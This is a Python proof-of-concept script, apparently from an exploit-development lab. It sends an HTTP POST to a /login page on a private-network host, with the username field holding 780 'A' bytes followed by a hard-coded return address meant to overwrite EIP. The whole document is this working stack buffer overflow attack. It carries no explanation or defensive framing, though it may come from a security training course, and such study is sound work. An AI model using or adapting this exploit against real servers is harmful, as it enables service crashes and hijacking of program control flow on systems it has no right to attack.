#!/usr/bin/python
import socket
import time
import sys
import codecs

bufSize = 780
eip = "\x83\x0c\x09\x10"

inputBuffer = ("A" * bufSize) + eip

print ("\nSending evil buffer with %s bytes" % str(len(inputBuffer)))
        
content = "username=" + inputBuffer + "&password=Z"
        
buffer = "POST /login HTTP/1.1\r\n"
buffer += "Host: 192.168.211.10\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Referer: http://192.168.211.10/login\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: "+str(len(content))+"\r\n"
buffer += "\r\n"
buffer += content
        
try:
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.211.10", 80))
    s.send(codecs.encode(buffer, 'utf-8') )
    s.close()
except:
    print ("\nCould not connect!")
    sys.exit()

